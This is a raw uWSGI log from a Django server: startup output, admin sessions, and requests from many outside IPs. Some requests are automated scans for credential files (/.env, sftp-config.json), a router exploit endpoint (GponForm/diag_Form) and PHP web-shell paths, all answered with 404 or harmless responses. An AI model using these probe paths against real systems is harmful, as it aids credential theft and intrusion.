uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.8.10 (default, Mar 15 2022, 12:22:08)  [GCC 9.4.0]
Python main interpreter initialized at 0x560dcf2c6ed0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
python threads support enabled
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 416880 bytes (407 KB) for 8 cores
*** Operational MODE: preforking+threaded ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x560dcf2c6ed0 pid: 24784 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI master process (pid: 24784)
spawned uWSGI worker 1 (pid: 24786, cores: 2)
spawned uWSGI worker 2 (pid: 24787, cores: 2)
spawned uWSGI worker 3 (pid: 24789, cores: 2)
spawned uWSGI worker 4 (pid: 24791, cores: 2)
[pid: 24791|app: 0|req: 1/1] 113.200.174.49 () {44 vars in 1016 bytes} [Fri Apr 22 19:26:43 2022] GET /admin/ => generated 4321 bytes in 302 msecs (HTTP/1.1 200) 9 headers in 334 bytes (1 switches on core 0)
[pid: 24789|app: 0|req: 1/2] 113.200.174.49 () {38 vars in 644 bytes} [Fri Apr 22 19:28:36 2022] GET /favicon.ico => generated 179 bytes in 269 msecs (HTTP/1.1 404) 6 headers in 199 bytes (1 switches on core 0)
[pid: 24791|app: 0|req: 2/3] 113.200.174.49 () {42 vars in 769 bytes} [Fri Apr 22 19:28:37 2022] GET /admin/ => generated 0 bytes in 1 msecs (HTTP/1.1 302) 10 headers in 372 bytes (1 switches on core 1)
[pid: 24791|app: 0|req: 3/4] 113.200.174.49 () {42 vars in 806 bytes} [Fri Apr 22 19:28:37 2022] GET /admin/login/?next=/admin/ => generated 2217 bytes in 13 msecs (HTTP/1.1 200) 10 headers in 502 bytes (1 switches on core 0)
[pid: 24787|app: 0|req: 1/5] 113.200.174.49 () {52 vars in 1131 bytes} [Fri Apr 22 19:28:42 2022] POST /admin/login/?next=/admin/ => generated 0 bytes in 467 msecs (HTTP/1.1 302) 12 headers in 666 bytes (1 switches on core 0)
[pid: 24791|app: 0|req: 4/6] 113.200.174.49 () {46 vars in 984 bytes} [Fri Apr 22 19:28:43 2022] GET /admin/ => generated 3981 bytes in 13 msecs (HTTP/1.1 200) 9 headers in 334 bytes (1 switches on core 1)
[pid: 24787|app: 0|req: 2/7] 113.200.174.49 () {42 vars in 757 bytes} [Fri Apr 22 19:28:55 2022] GET / => generated 5599 bytes in 43 msecs (HTTP/1.1 200) 9 headers in 425 bytes (1 switches on core 1)
[pid: 24786|app: 0|req: 1/8] 113.200.174.49 () {42 vars in 843 bytes} [Fri Apr 22 19:28:59 2022] GET /admin => generated 0 bytes in 247 msecs (HTTP/1.1 301) 6 headers in 216 bytes (1 switches on core 0)
[pid: 24786|app: 0|req: 2/9] 113.200.174.49 () {42 vars in 845 bytes} [Fri Apr 22 19:28:59 2022] GET /admin/ => generated 0 bytes in 22 msecs (HTTP/1.1 302) 10 headers in 372 bytes (1 switches on core 1)
[pid: 24791|app: 0|req: 5/10] 113.200.174.49 () {42 vars in 882 bytes} [Fri Apr 22 19:28:59 2022] GET /admin/login/?next=/admin/ => generated 2217 bytes in 5 msecs (HTTP/1.1 200) 10 headers in 502 bytes (1 switches on core 0)
[pid: 24791|app: 0|req: 6/11] 113.200.174.49 () {52 vars in 1131 bytes} [Fri Apr 22 19:29:04 2022] POST /admin/login/?next=/admin/ => generated 0 bytes in 218 msecs (HTTP/1.1 302) 12 headers in 666 bytes (1 switches on core 1)
[pid: 24791|app: 0|req: 7/12] 113.200.174.49 () {46 vars in 984 bytes} [Fri Apr 22 19:29:04 2022] GET /admin/ => generated 3981 bytes in 14 msecs (HTTP/1.1 200) 9 headers in 334 bytes (1 switches on core 0)
Fri Apr 22 19:33:32 2022 - uWSGI worker 4 screams: UAAAAAAH my master disconnected: i will kill myself !!!
*** Starting uWSGI 2.0.20 (64bit) on [Fri Apr 22 19:33:34 2022] ***
compiled with version: 9.4.0 on 22 April 2022 07:04:35
os: Linux-5.4.0-108-generic #122-Ubuntu SMP Tue Mar 29 07:34:30 UTC 2022
nodename: iZuf6gxtsgxni1m4qpg1i9Z
machine: x86_64
clock source: unix
pcre jit disabled
detected number of CPU cores: 2
current working directory: /wwwroot/magic
detected binary path: /usr/local/bin/uwsgi
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
chdir() to /wwwroot/magic
your processes number limit is 7289
your memory page size is 4096 bytes
detected max file descriptor number: 65535
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address 127.0.0.1:9090 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.8.10 (default, Mar 15 2022, 12:22:08)  [GCC 9.4.0]
Python main interpreter initialized at 0x55ec05eb1ed0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
python threads support enabled
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 416880 bytes (407 KB) for 8 cores
*** Operational MODE: preforking+threaded ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x55ec05eb1ed0 pid: 24809 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI master process (pid: 24809)
spawned uWSGI worker 1 (pid: 24811, cores: 2)
spawned uWSGI worker 2 (pid: 24812, cores: 2)
spawned uWSGI worker 3 (pid: 24814, cores: 2)
spawned uWSGI worker 4 (pid: 24815, cores: 2)
[pid: 24814|app: 0|req: 1/1] 113.200.174.49 () {44 vars in 1016 bytes} [Fri Apr 22 19:33:37 2022] GET /admin/ => generated 18482 bytes in 323 msecs (HTTP/1.1 200) 9 headers in 457 bytes (1 switches on core 0)
[pid: 24815|app: 0|req: 1/2] 113.200.174.49 () {44 vars in 1076 bytes} [Fri Apr 22 19:33:48 2022] GET /admin/api/userextensionmodel/ => generated 25176 bytes in 314 msecs (HTTP/1.1 200) 9 headers in 480 bytes (1 switches on core 0)
[pid: 24815|app: 0|req: 2/3] 113.200.174.49 () {42 vars in 911 bytes} [Fri Apr 22 19:33:49 2022] GET /admin/jsi18n/ => generated 8398 bytes in 8 msecs (HTTP/1.1 200) 6 headers in 207 bytes (1 switches on core 1)
[pid: 24815|app: 0|req: 3/4] 113.200.174.49 () {44 vars in 1117 bytes} [Fri Apr 22 19:33:51 2022] GET /admin/api/userextensionmodel/2/change/ => generated 19956 bytes in 39 msecs (HTTP/1.1 200) 9 headers in 480 bytes (1 switches on core 0)
[pid: 24815|app: 0|req: 4/5] 113.200.174.49 () {42 vars in 911 bytes} [Fri Apr 22 19:33:52 2022] GET /admin/jsi18n/ => generated 8398 bytes in 6 msecs (HTTP/1.1 200) 6 headers in 207 bytes (1 switches on core 1)
[pid: 24815|app: 0|req: 5/6] 113.200.174.49 () {44 vars in 1076 bytes} [Fri Apr 22 19:34:09 2022] GET /admin/api/userextensionmodel/ => generated 25176 bytes in 21 msecs (HTTP/1.1 200) 9 headers in 480 bytes (1 switches on core 0)
[pid: 24811|app: 0|req: 1/7] 113.200.174.49 () {42 vars in 911 bytes} [Fri Apr 22 19:34:09 2022] GET /admin/jsi18n/ => generated 8398 bytes in 247 msecs (HTTP/1.1 200) 6 headers in 207 bytes (1 switches on core 0)
[pid: 24815|app: 0|req: 6/8] 113.200.174.49 () {44 vars in 1117 bytes} [Fri Apr 22 19:34:10 2022] GET /admin/api/userextensionmodel/2/change/ => generated 19956 bytes in 21 msecs (HTTP/1.1 200) 9 headers in 480 bytes (1 switches on core 1)
[pid: 24815|app: 0|req: 7/9] 113.200.174.49 () {42 vars in 911 bytes} [Fri Apr 22 19:34:10 2022] GET /admin/jsi18n/ => generated 8398 bytes in 7 msecs (HTTP/1.1 200) 6 headers in 207 bytes (1 switches on core 0)
[pid: 24815|app: 0|req: 8/10] 113.200.174.49 () {44 vars in 1076 bytes} [Fri Apr 22 19:34:12 2022] GET /admin/api/userextensionmodel/ => generated 25176 bytes in 16 msecs (HTTP/1.1 200) 9 headers in 480 bytes (1 switches on core 1)
[pid: 24815|app: 0|req: 9/11] 113.200.174.49 () {42 vars in 911 bytes} [Fri Apr 22 19:34:12 2022] GET /admin/jsi18n/ => generated 8398 bytes in 6 msecs (HTTP/1.1 200) 6 headers in 207 bytes (1 switches on core 0)
[pid: 24814|app: 0|req: 2/12] 113.200.174.49 () {44 vars in 1117 bytes} [Fri Apr 22 19:34:13 2022] GET /admin/api/userextensionmodel/1/change/ => generated 19941 bytes in 49 msecs (HTTP/1.1 200) 9 headers in 480 bytes (1 switches on core 1)
[pid: 24812|app: 0|req: 1/13] 113.200.174.49 () {42 vars in 911 bytes} [Fri Apr 22 19:34:13 2022] GET /admin/jsi18n/ => generated 8398 bytes in 257 msecs (HTTP/1.1 200) 6 headers in 207 bytes (1 switches on core 0)
[pid: 24811|app: 0|req: 2/14] 198.235.24.19 () {30 vars in 595 bytes} [Fri Apr 22 19:34:15 2022] GET / => generated 145 bytes in 10 msecs (HTTP/1.1 200) 7 headers in 225 bytes (1 switches on core 1)
[pid: 24811|app: 0|req: 3/15] 113.200.174.49 () {52 vars in 1380 bytes} [Fri Apr 22 19:34:36 2022] POST /admin/api/userextensionmodel/1/change/ => generated 0 bytes in 86 msecs (HTTP/1.1 302) 10 headers in 702 bytes (1 switches on core 0)
[pid: 24812|app: 0|req: 2/16] 113.200.174.49 () {46 vars in 1443 bytes} [Fri Apr 22 19:34:37 2022] GET /admin/api/userextensionmodel/1/change/ => generated 20161 bytes in 93 msecs (HTTP/1.1 200) 10 headers in 578 bytes (1 switches on core 1)
[pid: 24814|app: 0|req: 3/17] 113.200.174.49 () {42 vars in 911 bytes} [Fri Apr 22 19:34:37 2022] GET /admin/jsi18n/ => generated 8398 bytes in 7 msecs (HTTP/1.1 200) 6 headers in 207 bytes (1 switches on core 0)
[pid: 24814|app: 0|req: 4/18] 113.200.174.49 () {44 vars in 980 bytes} [Fri Apr 22 19:35:40 2022] GET /admin/api/userextensionmodel/ => generated 25176 bytes in 41 msecs (HTTP/1.1 200) 9 headers in 480 bytes (1 switches on core 1)
[pid: 24815|app: 0|req: 10/19] 113.200.174.49 () {42 vars in 854 bytes} [Fri Apr 22 19:35:41 2022] GET /admin/jsi18n/ => generated 8398 bytes in 7 msecs (HTTP/1.1 200) 6 headers in 207 bytes (1 switches on core 1)
[pid: 24815|app: 0|req: 11/20] 113.200.174.49 () {46 vars in 1011 bytes} [Fri Apr 22 19:35:50 2022] GET /admin/api/userextensionmodel/ => generated 25176 bytes in 21 msecs (HTTP/1.1 200) 9 headers in 480 bytes (1 switches on core 0)
[pid: 24815|app: 0|req: 12/21] 113.200.174.49 () {42 vars in 854 bytes} [Fri Apr 22 19:35:50 2022] GET /admin/jsi18n/ => generated 8398 bytes in 6 msecs (HTTP/1.1 200) 6 headers in 207 bytes (1 switches on core 1)
[pid: 24812|app: 0|req: 3/22] 113.200.174.49 () {42 vars in 877 bytes} [Fri Apr 22 19:35:53 2022] GET / => generated 5826 bytes in 19 msecs (HTTP/1.1 200) 8 headers in 402 bytes (1 switches on core 0)
[pid: 24812|app: 0|req: 4/23] 113.200.174.49 () {42 vars in 889 bytes} [Fri Apr 22 19:35:56 2022] GET /admin/ => generated 17875 bytes in 23 msecs (HTTP/1.1 200) 9 headers in 457 bytes (1 switches on core 1)
[pid: 24815|app: 0|req: 13/24] 113.200.174.49 () {44 vars in 980 bytes} [Fri Apr 22 19:35:58 2022] GET /admin/api/userextensionmodel/ => generated 25176 bytes in 20 msecs (HTTP/1.1 200) 9 headers in 480 bytes (1 switches on core 0)
[pid: 24811|app: 0|req: 4/25] 113.200.174.49 () {42 vars in 854 bytes} [Fri Apr 22 19:35:58 2022] GET /admin/jsi18n/ => generated 8398 bytes in 10 msecs (HTTP/1.1 200) 6 headers in 207 bytes (1 switches on core 1)
[pid: 24815|app: 0|req: 14/26] 113.200.174.49 () {44 vars in 1021 bytes} [Fri Apr 22 19:35:59 2022] GET /admin/api/userextensionmodel/1/change/ => generated 19931 bytes in 22 msecs (HTTP/1.1 200) 9 headers in 480 bytes (1 switches on core 1)
[pid: 24815|app: 0|req: 15/27] 113.200.174.49 () {42 vars in 863 bytes} [Fri Apr 22 19:35:59 2022] GET /admin/jsi18n/ => generated 8398 bytes in 6 msecs (HTTP/1.1 200) 6 headers in 207 bytes (1 switches on core 0)
[pid: 24811|app: 0|req: 5/28] 113.200.174.49 () {42 vars in 877 bytes} [Fri Apr 22 19:36:09 2022] GET / => generated 5826 bytes in 33 msecs (HTTP/1.1 200) 8 headers in 402 bytes (1 switches on core 0)
[pid: 24815|app: 0|req: 16/29] 113.200.174.49 () {44 vars in 962 bytes} [Fri Apr 22 19:36:11 2022] GET /api/userextensionmodel/ => generated 11228 bytes in 34 msecs (HTTP/1.1 200) 8 headers in 409 bytes (1 switches on core 1)
[pid: 24815|app: 0|req: 17/30] 64.62.197.2 () {28 vars in 303 bytes} [Fri Apr 22 20:08:53 2022] GET / => generated 139 bytes in 2 msecs (HTTP/1.1 200) 7 headers in 225 bytes (1 switches on core 0)
[pid: 24812|app: 0|req: 5/31] 192.241.220.196 () {34 vars in 393 bytes} [Fri Apr 22 20:14:49 2022] GET / => generated 139 bytes in 2 msecs (HTTP/1.1 200) 7 headers in 225 bytes (1 switches on core 0)
[pid: 24815|app: 0|req: 18/32] 113.200.174.49 () {42 vars in 934 bytes} [Fri Apr 22 20:19:39 2022] GET /favicon.ico => generated 179 bytes in 2 msecs (HTTP/1.1 404) 5 headers in 176 bytes (1 switches on core 1)
[pid: 24812|app: 0|req: 6/33] 175.27.188.128 () {40 vars in 591 bytes} [Fri Apr 22 20:40:12 2022] HEAD / => generated 145 bytes in 2 msecs (HTTP/1.1 200) 7 headers in 225 bytes (1 switches on core 1)
[pid: 24815|app: 0|req: 19/34] 175.27.188.128 () {40 vars in 723 bytes} [Fri Apr 22 20:40:13 2022] GET / => generated 5611 bytes in 6 msecs (HTTP/1.1 200) 8 headers in 402 bytes (1 switches on core 0)
[pid: 24815|app: 0|req: 20/35] 37.156.188.30 () {32 vars in 462 bytes} [Fri Apr 22 21:56:04 2022] GET / => generated 148 bytes in 1 msecs (HTTP/1.1 200) 7 headers in 225 bytes (1 switches on core 1)
[pid: 24815|app: 0|req: 21/36] 83.97.20.34 () {30 vars in 327 bytes} [Fri Apr 22 21:56:30 2022] GET / => generated 139 bytes in 2 msecs (HTTP/1.0 200) 7 headers in 225 bytes (1 switches on core 1)
[pid: 24815|app: 0|req: 22/37] 106.55.239.218 () {40 vars in 591 bytes} [Fri Apr 22 22:13:17 2022] HEAD / => generated 145 bytes in 2 msecs (HTTP/1.1 200) 7 headers in 225 bytes (1 switches on core 1)
[pid: 24811|app: 0|req: 6/38] 106.55.239.218 () {40 vars in 698 bytes} [Fri Apr 22 22:13:18 2022] GET / => generated 5611 bytes in 6 msecs (HTTP/1.1 200) 8 headers in 402 bytes (1 switches on core 1)
[pid: 24815|app: 0|req: 23/39] 111.7.96.150 () {32 vars in 355 bytes} [Fri Apr 22 23:03:56 2022] GET / => generated 148 bytes in 2 msecs (HTTP/1.1 200) 7 headers in 225 bytes (1 switches on core 0)
[pid: 24811|app: 0|req: 7/40] 123.160.221.19 () {32 vars in 357 bytes} [Fri Apr 22 23:03:59 2022] GET / => generated 148 bytes in 2 msecs (HTTP/1.1 200) 7 headers in 225 bytes (1 switches on core 0)
[pid: 24815|app: 0|req: 24/41] 185.83.144.103 () {36 vars in 530 bytes} [Fri Apr 22 23:10:20 2022] GET /php.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 176 bytes (1 switches on core 1)
[pid: 24815|app: 0|req: 25/42] 111.13.63.182 () {32 vars in 353 bytes} [Fri Apr 22 23:11:27 2022] GET / => generated 139 bytes in 2 msecs (HTTP/1.1 200) 7 headers in 225 bytes (1 switches on core 0)
[pid: 24812|app: 0|req: 7/43] 64.225.1.147 () {36 vars in 478 bytes} [Fri Apr 22 23:53:17 2022] GET / => generated 139 bytes in 2 msecs (HTTP/1.1 200) 7 headers in 225 bytes (1 switches on core 0)
[pid: 24812|app: 0|req: 8/44] 54.36.148.67 () {34 vars in 470 bytes} [Sat Apr 23 00:20:16 2022] GET /robots.txt => generated 179 bytes in 2 msecs (HTTP/1.1 404) 5 headers in 176 bytes (1 switches on core 1)
[pid: 24815|app: 0|req: 26/45] 51.222.253.18 () {34 vars in 451 bytes} [Sat Apr 23 00:20:17 2022] GET / => generated 145 bytes in 1 msecs (HTTP/1.1 200) 7 headers in 225 bytes (1 switches on core 0)
[pid: 24812|app: 0|req: 9/46] 86.201.74.53 () {36 vars in 520 bytes} [Sat Apr 23 01:03:20 2022] GET /.env => generated 25 bytes in 2 msecs (HTTP/1.1 404) 7 headers in 223 bytes (1 switches on core 1)
[pid: 24812|app: 0|req: 10/47] 86.201.74.53 () {40 vars in 627 bytes} [Sat Apr 23 01:03:21 2022] POST / => generated 46 bytes in 2 msecs (HTTP/1.1 405) 7 headers in 240 bytes (1 switches on core 0)
[pid: 24815|app: 0|req: 27/48] 27.219.138.99 () {38 vars in 498 bytes} [Sat Apr 23 01:37:42 2022] POST /GponForm/diag_Form?images/ => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 176 bytes (1 switches on core 1)
[pid: 24812|app: 0|req: 11/49] 92.118.161.25 () {30 vars in 449 bytes} [Sat Apr 23 01:45:17 2022] GET / => generated 148 bytes in 2 msecs (HTTP/1.1 200) 7 headers in 225 bytes (1 switches on core 1)
[pid: 24815|app: 0|req: 28/50] 83.97.20.34 () {30 vars in 326 bytes} [Sat Apr 23 02:17:00 2022] GET / => generated 139 bytes in 2 msecs (HTTP/1.0 200) 7 headers in 225 bytes (1 switches on core 0)
[pid: 24814|app: 0|req: 5/51] 101.133.139.201 () {34 vars in 441 bytes} [Sat Apr 23 02:55:16 2022] GET / => generated 145 bytes in 2 msecs (HTTP/1.1 200) 7 headers in 225 bytes (1 switches on core 0)
[pid: 24815|app: 0|req: 29/52] 47.103.8.240 () {34 vars in 442 bytes} [Sat Apr 23 02:57:36 2022] GET / => generated 157 bytes in 2 msecs (HTTP/1.1 200) 7 headers in 225 bytes (1 switches on core 1)
[pid: 24811|app: 0|req: 8/53] 63.161.104.189 () {48 vars in 887 bytes} [Sat Apr 23 03:03:06 2022] POST /wp-admin/css/colors/blue/red.php => generated 179 bytes in 3 msecs (HTTP/1.1 404) 5 headers in 176 bytes (1 switches on core 1)
[pid: 24815|app: 0|req: 30/54] 185.180.143.79 () {34 vars in 486 bytes} [Sat Apr 23 03:40:18 2022] GET / => generated 139 bytes in 2 msecs (HTTP/1.1 200) 7 headers in 225 bytes (1 switches on core 0)
[pid: 24815|app: 0|req: 31/55] 42.192.200.93 () {32 vars in 364 bytes} [Sat Apr 23 03:46:00 2022] GET / => generated 121 bytes in 2 msecs (HTTP/1.1 200) 7 headers in 225 bytes (1 switches on core 1)
[pid: 24811|app: 0|req: 9/56] 116.233.201.211 () {30 vars in 339 bytes} [Sat Apr 23 03:46:02 2022] GET / => generated 139 bytes in 2 msecs (HTTP/1.1 200) 7 headers in 225 bytes (1 switches on core 0)
[pid: 24811|app: 0|req: 10/57] 116.233.201.211 () {42 vars in 799 bytes} [Sat Apr 23 03:46:02 2022] POST /cgi-bin/luci/;stok=/locale?form=lang => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 176 bytes (1 switches on core 1)
[pid: 24815|app: 0|req: 32/58] 116.233.201.211 () {30 vars in 339 bytes} [Sat Apr 23 03:46:02 2022] GET / => generated 139 bytes in 1 msecs (HTTP/1.1 200) 7 headers in 225 bytes (1 switches on core 1)
[pid: 24815|app: 0|req: 33/59] 116.233.201.211 () {30 vars in 369 bytes} [Sat Apr 23 03:46:02 2022] GET /navigation.html => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 176 bytes (1 switches on core 0)
[pid: 24815|app: 0|req: 34/60] 116.233.201.211 () {30 vars in 339 bytes} [Sat Apr 23 03:46:02 2022] GET / => generated 139 bytes in 1 msecs (HTTP/1.1 200) 7 headers in 225 bytes (1 switches on core 1)
[pid: 24815|app: 0|req: 35/61] 116.233.201.211 () {30 vars in 339 bytes} [Sat Apr 23 03:46:02 2022] GET / => generated 139 bytes in 1 msecs (HTTP/1.1 200) 7 headers in 225 bytes (1 switches on core 0)
[pid: 24812|app: 0|req: 12/62] 116.233.201.211 () {30 vars in 363 bytes} [Sat Apr 23 03:46:02 2022] GET /KingViewWeb/ => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 176 bytes (1 switches on core 0)
[pid: 24812|app: 0|req: 13/63] 116.233.201.211 () {30 vars in 365 bytes} [Sat Apr 23 03:46:02 2022] GET /webconfig.ini => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 176 bytes (1 switches on core 1)
[pid: 24814|app: 0|req: 6/64] 116.233.201.211 () {30 vars in 339 bytes} [Sat Apr 23 03:46:02 2022] GET / => generated 139 bytes in 1 msecs (HTTP/1.1 200) 7 headers in 225 bytes (1 switches on core 1)
[pid: 24812|app: 0|req: 14/65] 116.233.201.211 () {30 vars in 422 bytes} [Sat Apr 23 03:46:02 2022] GET /fx_plcinf.html?CMD=Monitor%20Start&LANG=EN => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 176 bytes (1 switches on core 1)
[pid: 24815|app: 0|req: 36/66] 116.233.201.211 () {30 vars in 365 bytes} [Sat Apr 23 03:46:03 2022] GET /ifixwebspace/ => generated 179 bytes in 2 msecs (HTTP/1.1 404) 5 headers in 176 bytes (1 switches on core 0)
[pid: 24812|app: 0|req: 15/67] 117.63.38.207 () {38 vars in 498 bytes} [Sat Apr 23 03:48:24 2022] POST /GponForm/diag_Form?images/ => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 176 bytes (1 switches on core 0)
[pid: 24812|app: 0|req: 16/68] 31.45.245.142 () {32 vars in 461 bytes} [Sat Apr 23 04:02:30 2022] GET / => generated 148 bytes in 1 msecs (HTTP/1.1 200) 7 headers in 225 bytes (1 switches on core 1)
[pid: 24812|app: 0|req: 17/69] 18.163.84.222 () {32 vars in 364 bytes} [Sat Apr 23 04:03:51 2022] GET / => generated 121 bytes in 2 msecs (HTTP/1.1 200) 7 headers in 225 bytes (1 switches on core 0)
[pid: 24814|app: 0|req: 7/70] 39.98.252.148 () {34 vars in 439 bytes} [Sat Apr 23 04:44:46 2022] GET / => generated 145 bytes in 2 msecs (HTTP/1.1 200) 7 headers in 225 bytes (1 switches on core 0)
[pid: 24815|app: 0|req: 37/71] 47.102.134.70 () {34 vars in 443 bytes} [Sat Apr 23 04:49:05 2022] GET / => generated 157 bytes in 2 msecs (HTTP/1.1 200) 7 headers in 225 bytes (1 switches on core 1)
[pid: 24815|app: 0|req: 38/72] 193.124.7.9 () {32 vars in 364 bytes} [Sat Apr 23 05:06:52 2022] GET / => generated 127 bytes in 1 msecs (HTTP/1.1 200) 7 headers in 225 bytes (1 switches on core 0)
[pid: 24815|app: 0|req: 39/73] 1.234.23.64 () {36 vars in 543 bytes} [Sat Apr 23 05:40:35 2022] GET /sftp-config.json => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 176 bytes (1 switches on core 1)
[pid: 24815|app: 0|req: 40/74] 221.2.155.199 () {30 vars in 325 bytes} [Sat Apr 23 05:44:38 2022] GET / => generated 121 bytes in 1 msecs (HTTP/1.0 200) 7 headers in 225 bytes (1 switches on core 0)
[pid: 24815|app: 0|req: 41/75] 80.82.78.39 () {34 vars in 388 bytes} [Sat Apr 23 05:51:47 2022] GET / => generated 148 bytes in 1 msecs (HTTP/1.1 200) 7 headers in 225 bytes (1 switches on core 1)
[pid: 24812|app: 0|req: 18/76] 44.236.207.248 () {40 vars in 717 bytes} [Sat Apr 23 05:53:28 2022] GET / => generated 5611 bytes in 8 msecs (HTTP/1.1 200) 8 headers in 402 bytes (1 switches on core 1)
[pid: 24812|app: 0|req: 19/77] 124.235.138.10 () {40 vars in 720 bytes} [Sat Apr 23 06:11:55 2022] GET / => generated 5611 bytes in 5 msecs (HTTP/1.1 200) 8 headers in 402 bytes (1 switches on core 0)
[pid: 24812|app: 0|req: 20/78] 60.186.193.140 () {40 vars in 755 bytes} [Sat Apr 23 06:12:01 2022] GET /favicon.ico => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 176 bytes (1 switches on core 1)
[pid: 24815|app: 0|req: 42/79] 8.219.50.83 () {32 vars in 370 bytes} [Sat Apr 23 06:32:03 2022] GET / => generated 157 bytes in 2 msecs (HTTP/1.1 200) 7 headers in 225 bytes (1 switches on core 0)
[pid: 24812|app: 0|req: 21/80] 193.118.53.202 () {34 vars in 486 bytes} [Sat Apr 23 06:35:54 2022] GET / => generated 139 bytes in 1 msecs (HTTP/1.1 200) 7 headers in 225 bytes (1 switches on core 1)
[pid: 24812|app: 0|req: 22/81] 5.45.126.21 () {34 vars in 507 bytes} [Sat Apr 23 06:41:37 2022] GET /wp-content/plugins/elementor/readme.txt => generated 179 bytes in 2 msecs (HTTP/1.1 404) 5 headers in 176 bytes (1 switches on core 1)
[pid: 24812|app: 0|req: 23/82] 83.97.20.34 () {30 vars in 327 bytes} [Sat Apr 23 06:51:37 2022] GET / => generated 139 bytes in 2 msecs (HTTP/1.0 200) 7 headers in 225 bytes (1 switches on core 0)
[pid: 24815|app: 0|req: 43/83] 205.210.31.150 () {30 vars in 596 bytes} [Sat Apr 23 07:39:38 2022] GET / => generated 145 bytes in 1 msecs (HTTP/1.1 200) 7 headers in 225 bytes (1 switches on core 0)
[pid: 24812|app: 0|req: 24/84] 89.248.165.217 () {30 vars in 373 bytes} [Sat Apr 23 08:12:09 2022] GET / => generated 121 bytes in 2 msecs (HTTP/1.0 200) 7 headers in 225 bytes (1 switches on core 1)
[pid: 24815|app: 0|req: 44/85] 205.210.31.12 () {30 vars in 583 bytes} [Sat Apr 23 08:18:19 2022] GET / => generated 121 bytes in 1 msecs (HTTP/1.0 200) 7 headers in 225 bytes (1 switches on core 1)
[pid: 24815|app: 0|req: 45/86] 92.118.36.208 () {54 vars in 1024 bytes} [Sat Apr 23 08:31:39 2022] GET /g4jdo4/xmlrpc.php => generated 179 bytes in 2 msecs (HTTP/1.1 404) 5 headers in 176 bytes (1 switches on core 0)
[pid: 24811|app: 0|req: 11/87] 151.106.17.123 () {44 vars in 736 bytes} [Sat Apr 23 08:43:08 2022] POST /wpecho.php => generated 179 bytes in 2 msecs (HTTP/1.1 404) 5 headers in 176 bytes (1 switches on core 0)
[pid: 24815|app: 0|req: 46/88] 18.163.84.222 () {32 vars in 364 bytes} [Sat Apr 23 08:47:08 2022] GET / => generated 121 bytes in 2 msecs (HTTP/1.1 200) 7 headers in 225 bytes (1 switches on core 1)
[pid: 24812|app: 0|req: 25/89] 27.115.124.100 () {30 vars in 333 bytes} [Sat Apr 23 09:09:03 2022] GET / => generated 139 bytes in 1 msecs (HTTP/1.1 200) 7 headers in 225 bytes (1 switches on core 1)
[pid: 24812|app: 0|req: 26/90] 27.115.124.36 () {32 vars in 392 bytes} [Sat Apr 23 09:09:23 2022] GET /favicon.ico => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 176 bytes (1 switches on core 1)
[pid: 24815|app: 0|req: 47/91] 27.115.124.108 () {32 vars in 391 bytes} [Sat Apr 23 09:09:23 2022] GET /robots.txt => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 176 bytes (1 switches on core 0)
[pid: 24815|app: 0|req: 48/92] 27.115.124.100 () {32 vars in 393 bytes} [Sat Apr 23 09:09:23 2022] GET /sitemap.xml => generated 179 bytes in 2 msecs (HTTP/1.1 404) 5 headers in 176 bytes (1 switches on core 1)
[pid: 24815|app: 0|req: 49/93] 130.255.166.174 () {40 vars in 605 bytes} [Sat Apr 23 09:50:56 2022] GET /robots.txt => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 176 bytes (1 switches on core 0)
[pid: 24815|app: 0|req: 50/94] 130.255.166.235 () {40 vars in 605 bytes} [Sat Apr 23 09:50:56 2022] GET /humans.txt => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 176 bytes (1 switches on core 1)
[pid: 24812|app: 0|req: 27/95] 130.255.166.221 () {40 vars in 599 bytes} [Sat Apr 23 09:50:57 2022] GET /ads.txt => generated 179 bytes in 2 msecs (HTTP/1.1 404) 5 headers in 176 bytes (1 switches on core 0)
[pid: 24814|app: 0|req: 8/96] 130.255.166.219 () {40 vars in 606 bytes} [Sat Apr 23 09:50:58 2022] GET / => generated 5611 bytes in 16 msecs (HTTP/1.1 200) 8 headers in 402 bytes (1 switches on core 0)
[pid: 24814|app: 0|req: 9/97] 167.248.133.60 () {34 vars in 441 bytes} [Sat Apr 23 10:15:14 2022] GET / => generated 139 bytes in 2 msecs (HTTP/1.1 200) 7 headers in 225 bytes (1 switches on core 1)
